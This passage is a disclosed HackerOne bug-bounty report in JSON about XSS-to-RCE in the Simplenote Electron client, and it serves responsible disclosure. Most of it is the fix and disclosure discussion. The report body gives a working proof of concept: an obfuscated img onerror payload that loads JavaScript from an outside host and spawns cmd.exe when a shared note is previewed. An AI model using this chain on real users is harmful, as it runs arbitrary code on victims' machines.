+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/241/479/3bca65579fab70b8df026470af0b3d8139a7a57c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222903Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6070a573d844affc26a99c71b43086a60c94ddb799814e7a722ebfe8d9821b1d", 
+                    "type": "image/png", 
+                    "id": 241479, 
+                    "filename": "image.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-22T12:21:59.833Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T12:21:59.833Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "This morning while launching Simplenote the following message was displayed:\n\n{F241479}\n\nI hope you consider rewording the message to notify your users that this is a security update.", 
+            "markdown_message": "<p>This morning while launching Simplenote the following message was displayed:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"image.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/241/479/3bca65579fab70b8df026470af0b3d8139a7a57c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222903Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=6070a573d844affc26a99c71b43086a60c94ddb799814e7a722ebfe8d9821b1d\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/241/479/3bca65579fab70b8df026470af0b3d8139a7a57c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222903Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=6070a573d844affc26a99c71b43086a60c94ddb799814e7a722ebfe8d9821b1d\" class=\"markdown-inline-image\"></a></p>\n\n<p>I hope you consider rewording the message to notify your users that this is a security update.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2176463, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T13:57:05.853Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T13:57:05.853Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @roundhill,\n\nConfirming here also the successful fix in 1.1.0. I have prepared a brief blogpost and am wondering if it would be possible to request disclosure permission, however am completely happy to hold if an advisory is being prepared or further investigation taking place :)\n\nThanks and kind regards\n\nYasin", 
+            "markdown_message": "<p>Hi <a href=\"/roundhill\">@roundhill</a>,</p>\n\n<p>Confirming here also the successful fix in 1.1.0. I have prepared a brief blogpost and am wondering if it would be possible to request disclosure permission, however am completely happy to hold if an advisory is being prepared or further investigation taking place :)</p>\n\n<p>Thanks and kind regards</p>\n\n<p>Yasin</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2176600, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T14:09:17.861Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T14:09:17.861Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Just to add one more little suggestion before you close this report as resolved, the [current fix](https://github.com/Automattic/simplenote-electron/pull/612) consists of adding the `showdown-xss-filter` dependency. I would like to emphasise the fact that this project is [not actively maintained](https://github.com/VisionistInc/showdown-xss-filter/commits/master) and you should not depend on an XSS filter to prevent RCE. Please consider introducing a [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).", 
+            "markdown_message": "<p>Just to add one more little suggestion before you close this report as resolved, the <a href=\"/redirect?signature=f9e102eb14c22379425319b929841b9f7605bf75&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fpull%2F612\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>current fix</span><i class=\"icon-external-link\"></i></a> consists of adding the <code>showdown-xss-filter</code> dependency. I would like to emphasise the fact that this project is <a href=\"/redirect?signature=5f85120a400e4c54e94ba8c3d95bb0ffeaaeab65&amp;url=https%3A%2F%2Fgithub.com%2FVisionistInc%2Fshowdown-xss-filter%2Fcommits%2Fmaster\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>not actively maintained</span><i class=\"icon-external-link\"></i></a> and you should not depend on an XSS filter to prevent RCE. Please consider introducing a <a href=\"/redirect?signature=8e7dbfc931c8b56f6f8f4f97167e41d712940348&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FCSP\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CSP</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2176620, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T17:42:24.763Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T17:43:42.213Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Thanks for the tip about CSP @edio, I will send that along to the team. \n\nI updated the [blog post](https://simplenote.com/2017/11/20/windows-and-linux-app-update-now-available-2/) with a bullet about the security fix.\n\nAnd updated the release notes: https://cldup.com/of9LKZOdP8.thumb.png\n\n@ysx a blog post sounds great to me, but will defer to @xknown on the disclosure.", 
+            "markdown_message": "<p>Thanks for the tip about CSP <a href=\"/edio\">@edio</a>, I will send that along to the team. </p>\n\n<p>I updated the <a href=\"/redirect?signature=a3298f0d38794cf52a82d115a603e126c3dbfc1c&amp;url=https%3A%2F%2Fsimplenote.com%2F2017%2F11%2F20%2Fwindows-and-linux-app-update-now-available-2%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>blog post</span><i class=\"icon-external-link\"></i></a> with a bullet about the security fix.</p>\n\n<p>And updated the release notes: <a title=\"https://cldup.com/of9LKZOdP8.thumb.png\" href=\"/redirect?signature=248f606642409982145ad2639d6c7936c742563d&amp;url=https%3A%2F%2Fcldup.com%2Fof9LKZOdP8.thumb.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cldup.com/of9LKZOdP8.thumb.png</span><i class=\"icon-external-link\"></i></a></p>\n\n<p><a href=\"/ysx\">@ysx</a> a blog post sounds great to me, but will defer to <a href=\"/xknown\">@xknown</a> on the disclosure.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2177199, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T18:44:00.118Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T18:44:00.118Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Thanks again @roundhill! I've added a preliminary summary to this report, and enclose a confidential preview link to the post \u2013 no problem regarding the disclosure.\n\nhttps://ysx.me.uk/p/0e249ad1-9ce4-4b64-a4e3-7f719f5bbf2d/", 
+            "markdown_message": "<p>Thanks again <a href=\"/roundhill\">@roundhill</a>! I&#39;ve added a preliminary summary to this report, and enclose a confidential preview link to the post \u2013 no problem regarding the disclosure.</p>\n\n<p><a title=\"https://ysx.me.uk/p/0e249ad1-9ce4-4b64-a4e3-7f719f5bbf2d/\" href=\"/redirect?signature=8926dd00b53aa308c36df5f5e75ddea4e4488a31&amp;url=https%3A%2F%2Fysx.me.uk%2Fp%2F0e249ad1-9ce4-4b64-a4e3-7f719f5bbf2d%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://ysx.me.uk/p/0e249ad1-9ce4-4b64-a4e3-7f719f5bbf2d/</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2177427, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-27T13:53:33.970Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-27T13:53:33.970Z", 
+            "actor": {
+                "username": "xknown", 
+                "url": "/xknown", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @ysx, sorry for the delayed response. Please feel free to do a public disclosure if you'd like.", 
+            "markdown_message": "<p>Hi <a href=\"/ysx\">@ysx</a>, sorry for the delayed response. Please feel free to do a public disclosure if you&#39;d like.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2183882, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-27T14:11:53.105Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-27T14:11:53.105Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "No problem @xknown and thanks very much for the approval. I have enclosed below a link to the final post, and please feel free to disclose this report upon marking as Resolved :)\n\nhttps://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/", 
+            "markdown_message": "<p>No problem <a href=\"/xknown\">@xknown</a> and thanks very much for the approval. I have enclosed below a link to the final post, and please feel free to disclose this report upon marking as Resolved :)</p>\n\n<p><a title=\"https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/\" href=\"/redirect?signature=e56440a028c05bd1f756b3207b070951a15e30d0&amp;url=https%3A%2F%2Fysx.me.uk%2Ftaking-note-xss-to-rce-in-the-simplenote-electron-client%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2183920, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-27T15:45:08.825Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-27T15:45:08.825Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "@xknown & @roundhill: I actually suggest using [DOMPurify](https://github.com/cure53/DOMPurify) instead of the `showdown-xss-filter` project. DOMPurify is actively maintained and as you may know Cure53 are renowned for their security research.", 
+            "markdown_message": "<p><a href=\"/xknown\">@xknown</a> &amp; <a href=\"/roundhill\">@roundhill</a>: I actually suggest using <a href=\"/redirect?signature=8294ab5a77607cf8a21faf6e0b883aa63217f068&amp;url=https%3A%2F%2Fgithub.com%2Fcure53%2FDOMPurify\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>DOMPurify</span><i class=\"icon-external-link\"></i></a> instead of the <code>showdown-xss-filter</code> project. DOMPurify is actively maintained and as you may know Cure53 are renowned for their security research.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2184108, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-29T13:43:38.773Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T13:43:38.773Z", 
+            "actor": {
+                "username": "xknown", 
+                "url": "/xknown", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "@edio that's a better choice indeed, I will send that along to the team.", 
+            "markdown_message": "<p><a href=\"/edio\">@edio</a> that&#39;s a better choice indeed, I will send that along to the team.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2188706, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "ysx", 
+                "url": "/ysx"
+            }, 
+            "created_at": "2017-11-29T13:45:24.090Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T13:45:24.090Z", 
+            "actor": {
+                "username": "xknown", 
+                "url": "/xknown", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi. Thanks again for the report. Marking this as resolved.", 
+            "markdown_message": "<p>Hi. Thanks again for the report. Marking this as resolved.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2188717, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-11-29T13:46:42.938Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T13:46:42.938Z", 
+            "actor": {
+                "url": "/automattic", 
+                "profile": {
+                    "name": "Automattic"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
+                }
+            }, 
+            "team_handle": "automattic", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "250.0", 
+            "collaborator": {
+                "username": "ysx", 
+                "url": "/ysx"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2188722, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-29T13:57:03.674Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-29T13:57:03.674Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "first_to_agree": true, 
+            "message": "No problem @xknown, thanks for the bounty. Requesting public disclosure.", 
+            "markdown_message": "<p>No problem <a href=\"/xknown\">@xknown</a>, thanks for the bounty. Requesting public disclosure.</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2188752, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-01T13:35:27.290Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-01T13:35:27.290Z", 
+            "actor": {
+                "username": "xknown", 
+                "url": "/xknown", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2193664, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-01T13:35:27.428Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-01T13:35:27.428Z", 
+            "actor": {
+                "username": "xknown", 
+                "url": "/xknown", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2193665, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "ysx", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/ysx", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/047/082/b5f65d678f8b1da395d8ae1bf7f89df15acaac53_small.jpg?1508768035"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -29579519.964894116, 
+    "disclosed_at": "2017-12-01T13:35:27.401Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/291539", 
+    "created_at": "2017-11-18T17:57:02.877Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>A carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file. </p>\n\n<p>The nature of Simplenote&#39;s content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to &quot;preview&quot; the Markdown-formatted note.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n\n<h3 id=\"prerequisites\">Prerequisites</h3>\n\n<p>A standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider <code>ysx.bz</code> the &quot;adversary&quot; server.</p>\n\n<p>Create a new JavaScript file (herein referred to as <code>hackerone-electron.js</code>) in the root directory, such that the path would read: <code>http://ysx.bz/hackerone-electron.js</code>.</p>\n\n<h3 id=\"external-javascript-file\">External JavaScript file</h3>\n\n<p>To prepare our exploit, populate this file with the following JavaScript code:</p>\n<pre class=\"highlight plaintext\"><code>write(&quot;&lt;h1&gt;Simplenote RCE via Electron - Windows - ysx&lt;/h1&gt;&quot;);\nwrite(&quot;&lt;h3&gt;Proof of concept in progress: popping &lt;pre&gt;netplwiz&lt;/pre&gt;. Please stand by!&lt;/h3&gt;&quot;);\nvar Process = process.binding(&#39;process_wrap&#39;).Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+&#39;=&#39;+env[key]);\nproc.spawn({file:&#39;cmd.exe&#39;,args:[&#39;/k netplwiz&#39;],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:&#39;ignore&#39;},{type:&#39;ignore&#39;},{type:&#39;ignore&#39;}]});\n</code></pre>\n<h3 id=\"encoding-and-exploitation\">Encoding and exploitation</h3>\n\n<p>Next, please open a JavaScript <code>eval</code> <a href=\"/redirect?signature=479b8bee07d4404dcfa43b2f02e2cc5bd3dffaed&amp;url=https%3A%2F%2Fwww.martineve.com%2F2007%2F05%2F15%2Fjavascript-eval-string-fromcharcode-encoder%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>encoder</span><i class=\"icon-external-link\"></i></a> and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an <code>&lt;img&gt;</code> tag as part of the crafted note.</p>\n<pre class=\"highlight plaintext\"><code>var js = document.createElement(&#39;script&#39;); js.type = &#39;text/javascript&#39;; js.src = &#39;http://ysx.bz/hackerone-electron.js&#39;; document.body.appendChild(js);\n</code></pre>\n<p>The above example should encode as follows:</p>\n<pre class=\"highlight plaintext\"><code>eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))\n</code></pre>\n<p>Next, create a new Markdown note within Simplenote for Windows, and paste the following <code>&lt;img&gt;</code> tag code.</p>\n<pre class=\"highlight plaintext\"><code>## Test Note\n### HackerOne Windows RCE PoC - pops &quot;netplwiz&quot;\n\n&lt;img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))&gt;\n</code></pre>\n<p>Upon selecting the <strong>Preview</strong> option of the Markdown note, the JavaScript will be executed. After several seconds, the <code>netplwiz</code> executable will launch on your Windows system.</p>\n\n<h3 id=\"supporting-evidence\">Supporting evidence</h3>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pre_exploit.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/684/6489094751adb742749c66de1ea3375dcc5dc37a/pre_exploit.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222903Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1878084b675228ff7660e6bb5ec56da65af59a51688af35daeae7607e6c747b8\" data-attachment-type=\"image/png\"><img 